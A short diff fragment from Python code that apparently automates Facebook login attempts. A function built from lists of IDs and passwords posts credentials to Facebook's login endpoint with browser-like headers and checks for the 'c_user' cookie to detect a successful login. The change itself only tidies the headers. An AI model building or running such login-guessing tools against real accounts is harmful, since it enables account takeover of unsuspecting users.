@@ -533,9 +533,7 @@ def _M4_(ids,pasx):
                         'Sec-Fetch-Mode': 'cors',
                         'Sec-Fetch-Site': 'same-origin',
                         'Pragma': 'no-cache',
-                        'Cache-Control': 'no-cache',
-                       # Requests doesn't support trailers
-                        # 'TE': 'trailers',}
+                        'Cache-Control': 'no-cache',}
                         lo = session.post('https://www.facebook.com/login.php/?login_attempt=1&display=popup',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
